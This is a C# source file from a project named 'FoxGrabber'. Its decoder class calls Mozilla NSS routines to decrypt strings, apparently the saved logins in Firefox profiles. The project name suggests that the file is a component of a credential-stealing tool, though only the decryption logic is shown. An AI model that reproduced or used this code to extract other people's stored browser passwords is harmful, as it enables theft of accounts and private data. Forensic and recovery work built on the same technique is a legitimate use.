namespace FoxGrabber
{
    using System;
    using System.Runtime.InteropServices;
    using System.Text;

    public class Decoder
    {
        public static string NewDecrypt(string cypherText)
        {
            var inStr = new StringBuilder(cypherText);
            var result = new Structures.TSECItem();
            var structure = (Structures.TSECItem)Marshal.PtrToStructure
            (
                new IntPtr(NSS.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, inStr, inStr.Length)), typeof(Structures.TSECItem)
            );
            if ((uint)NSS.PK11SDR_Decrypt(ref structure, ref result, 0) > 0 || result.SECItemLen == 0)
            {
                return null;
            }

            byte[] numArray = new byte[result.SECItemLen];
            Marshal.Copy(new IntPtr(result.SECItemData), numArray, 0, result.SECItemLen);
            return Encoding.UTF8.GetString(numArray);
        }

        public static string OldDecrypt(string cipherText)
        {
            var sb = new StringBuilder(cipherText);
            var tSecDec = new Structures.TSECItem();
            var structure = (Structures.TSECItem)Marshal.PtrToStructure
            (
                new IntPtr(NSS.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length)), typeof(Structures.TSECItem)
            );

            if (NSS.PK11SDR_Decrypt(ref structure, ref tSecDec, 0) == 0)
            {
                if (tSecDec.SECItemLen != 0)
                {
                    byte[] bvRet = new byte[tSecDec.SECItemLen];
                    Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
                    return Encoding.UTF8.GetString(bvRet);
                }
            }

            return null;
        }
    }
}